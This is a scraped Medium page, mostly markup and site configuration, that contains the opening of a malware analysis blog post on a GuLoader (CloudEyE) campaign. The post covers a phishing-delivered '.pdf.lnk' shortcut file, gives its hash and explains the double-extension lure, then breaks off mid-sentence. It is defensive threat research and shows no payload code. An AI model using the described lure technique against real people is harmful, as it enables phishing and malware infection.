1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="sb sc sd se sf l bx"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="cl ab sg cp"><div class="ab ia"><a rel="noopener follow" href="/?source=post_page---post_author_info--4b5f1d6d877--------------------------------"><div class="l sh si by sj ie"><div class="l fj"><img alt="Gi7w0rm" class="l fd by sk sl cx" src="https://miro.medium.com/v2/resize:fill:144:144/1*XNZYIunppMSwHbb0Dxx3cA.png" width="72" height="72" loading="lazy"/><div class="if by l sk sl fs n ig ft"></div></div></div></a></div><div class="j i d"><div class="ab"><span><button class="bf b bg z ep re eq er es et eu ev ew ex ey ez fa au fb fc fd bm fe ff">Follow</button></span><div class="dt l"><div><div><div class="bm" aria-hidden="false"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2F3a4e97b76a4b&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877&amp;newsletterV3=fa7639fc99f0&amp;newsletterV3Id=3a4e97b76a4b&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=---post_author_info--4b5f1d6d877---------------------subscribe_user-----------" rel="noopener follow"><button class="bf b bg z sp am sq sr ss st su sv sw sx ew ex ey ez fa fb fc fd bm fe ff" aria-label="Subscribe"><svg xmlns="http://www.w3.org/2000/svg" width="38" height="38" fill="none" viewBox="0 0 38 38" class="sm sn so"><rect width="0.5" height="6.5" x="26.25" y="9.25" rx="0.25"></rect><rect width="0.5" height="6.5" x="29.75" y="12.25" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5 19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="ab cn cp"><div class="l"><div class="ab q"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab q" rel="noopener follow" href="/?source=post_page---post_author_info--4b5f1d6d877--------------------------------"><h2 class="pw-author-name bf sy sz ta tb bk"><span class="gn ix">Written by <!-- -->Gi7w0rm</span></h2></a></div><div class="rc ab"><div class="l is"><span class="pw-follower-count bf b bg z bk"><a class="af ag ah ai aj ak al am an ao ap aq ar il" rel="noopener follow" href="/followers?source=post_page---post_author_info--4b5f1d6d877--------------------------------">193 Followers</a></span></div></div><div class="tc l"></div></div><div class="h k"><div class="ab"><span><button class="bf b bg z ep re eq er es et eu ev ew ex ey ez fa au fb fc fd bm fe ff">Follow</button></span><div class="dt l"><div><div><div class="bm" aria-hidden="false"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2F3a4e97b76a4b&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877&amp;newsletterV3=fa7639fc99f0&amp;newsletterV3Id=3a4e97b76a4b&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=---post_author_info--4b5f1d6d877---------------------subscribe_user-----------" rel="noopener follow"><button class="bf b bg z sp am sq sr ss st su sv sw sx ew ex ey ez fa fb fc fd bm fe ff" aria-label="Subscribe"><svg xmlns="http://www.w3.org/2000/svg" width="38" height="38" fill="none" viewBox="0 0 38 38" class="sm sn so"><rect width="0.5" height="6.5" x="26.25" y="9.25" rx="0.25"></rect><rect width="0.5" height="6.5" x="29.75" y="12.25" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5 19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="td bh te tf tg th ti tj"></div></div></div><div class="h k j"><div class="td bh te tk"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="tl ab ke iv"><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/about?autoplay=1&amp;source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><p class="bf b dv z du">About</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><p class="bf b dv z du">Careers</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="tm l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/business?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20241101-141657-368ddd3325"</script><script>window.__GRAPHQL_URI__ = "https://gi7w0rm.medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-4b5f1d6d877","user-fa7639fc99f0"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"lohpSummerUpsellEnabled":false,"publicationHierarchyEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"USER","id":"fa7639fc99f0","explicit":true},"viewerIsBot":false},"debug":{"requestId":"0ccbfb96-5189-40ed-a3a8-7c9a3a68cc1b","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-e5c237dcf719520925eb82ce76205130-7f2d34814e63ead0-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fgi7w0rm.medium.com\u002Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877","host":"gi7w0rm.medium.com","hostname":"gi7w0rm.medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20241101-141657-368ddd3325","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20241101-141657-368ddd3325","commit":"368ddd33257676ac7efa246a2596cb30755c7d31"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"gi7w0rm.medium.com\"})":null,"postResult({\"id\":\"4b5f1d6d877\"})":{"__ref":"Post:4b5f1d6d877"}},"LinkedAccounts:fa7639fc99f0":{"__typename":"LinkedAccounts","mastodon":null,"id":"fa7639fc99f0"},"UserViewerEdge:userId:fa7639fc99f0-viewerId:lo_79be97193dad":{"__typename":"UserViewerEdge","id":"userId:fa7639fc99f0-viewerId:lo_79be97193dad","isFollowing":false,"isUser":false,"isMuting":false},"NewsletterV3:3a4e97b76a4b":{"__typename":"NewsletterV3","id":"3a4e97b76a4b","type":"NEWSLETTER_TYPE_AUTHOR","slug":"fa7639fc99f0","name":"fa7639fc99f0","collection":null,"user":{"__ref":"User:fa7639fc99f0"}},"User:fa7639fc99f0":{"__typename":"User","id":"fa7639fc99f0","name":"Gi7w0rm","username":"gi7w0rm","newsletterV3":{"__ref":"NewsletterV3:3a4e97b76a4b"},"linkedAccounts":{"__ref":"LinkedAccounts:fa7639fc99f0"},"isSuspended":false,"imageId":"1*XNZYIunppMSwHbb0Dxx3cA.png","mediumMemberAt":0,"verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":193},"customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"gi7w0rm.medium.com"}},"hasSubdomain":true,"bio":"","isPartnerProgramEnrolled":false,"viewerEdge":{"__ref":"UserViewerEdge:userId:fa7639fc99f0-viewerId:lo_79be97193dad"},"viewerIsUser":false,"postSubscribeMembershipUpsellShownAt":0,"userPostCounts({\"includeResponsesCount\":true})":null,"membership":null,"allowNotes":true,"twitterScreenName":"Gi7w0rm"},"Paragraph:6dcf52d1a5ec_0":{"__typename":"Paragraph","id":"6dcf52d1a5ec_0","name":"d6e1","type":"H3","href":null,"layout":null,"metadata":null,"text":"CloudEyE — From .lnk to Shellcode","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_1":{"__typename":"Paragraph","id":"6dcf52d1a5ec_1","name":"10d9","type":"P","href":null,"layout":null,"metadata":null,"text":"Hello and welcome back to another blog post. Today, we will look at the infection chain of a well-known malware loader called CloudEye (GuLoader). In recent years, this shellcode-based downloader has become a challenging piece of code to analyze. In fact, during conversations I had with several acknowledged reverse engineers, many of them pointed out that GuLoader is under active development to this day and that every time someone releases an analysis, its developers are fast to react and change the shellcode to a degree where all freshly developed tools for analyzing it are useless again. This sophistication is also why this post is not going to touch the ShellCode itself. It is rather going to give an overview of a current CloudEyE campaign, starting with a malicious link file that came via a download link from a phishing mail and ending with the retrieval of the GuLoader shellcode.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_2":{"__typename":"Paragraph","id":"6dcf52d1a5ec_2","name":"3751","type":"P","href":null,"layout":null,"metadata":null,"text":"I highlighted the discussed part in this execution flow chart below:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*iZAFaE20Ffz3o6zT65W6DQ.png":{"__typename":"ImageMetadata","id":"1*iZAFaE20Ffz3o6zT65W6DQ.png","originalHeight":1807,"originalWidth":949,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6dcf52d1a5ec_3":{"__typename":"Paragraph","id":"6dcf52d1a5ec_3","name":"8f9f","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*iZAFaE20Ffz3o6zT65W6DQ.png"},"text":"Figure 1: Attack Flow of this GuLoader campaign","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_4":{"__typename":"Paragraph","id":"6dcf52d1a5ec_4","name":"214d","type":"P","href":null,"layout":null,"metadata":null,"text":"For more information on this campaign, please refer to Section: Additional Findings (part 2).","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":63,"end":92,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_5":{"__typename":"Paragraph","id":"6dcf52d1a5ec_5","name":"cc20","type":"H4","href":null,"layout":null,"metadata":null,"text":"Stage 1: A “fake” pdf","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_6":{"__typename":"Paragraph","id":"6dcf52d1a5ec_6","name":"21d2","type":"P","href":null,"layout":null,"metadata":null,"text":"For me, this investigation started as I was sifting through the results of a known online sandbox service called Triage. I sometimes do so to find uncommon malware that is currently not on my scope, trying to keep up with ongoing threat development together with the curiosity of discovering something unique. And while GuLoader is not a new threat, the sandbox results for one of its campaigns somehow stuck with me. So I decided to give it another look.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":113,"end":119,"href":"https:\u002F\u002Ftria.ge\u002Freports\u002Fpublic","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":354,"end":369,"href":"https:\u002F\u002Ftria.ge\u002F230703-ep773sef43","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_7":{"__typename":"Paragraph","id":"6dcf52d1a5ec_7","name":"ca12","type":"P","href":null,"layout":null,"metadata":null,"text":"The file we see uploaded to Triage is named “RFQ No 41 26_06_2023.pdf.lnk” and has the SHA-256 Hash: “748c0ef7a63980d4e8064b14fb95ba51947bfc7d9ccf39c6ef614026a89c39e5”.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_8":{"__typename":"Paragraph","id":"6dcf52d1a5ec_8","name":"00ab","type":"P","href":null,"layout":null,"metadata":null,"text":"The double-file ending should immediately set off your alarm bells. In Windows 10 and above, file endings are not rendered in File Explorer by default. Therefore, a double file ending means the original file-type ending is hidden, while the second last one (in this case .pdf) is shown. This is done to lure victims into thinking they are opening a file of the .pdf type, while they do something pretty different in opening a Windows Shortcut file. This Shortcut file in turn is then used to execute the attack. Let’s have 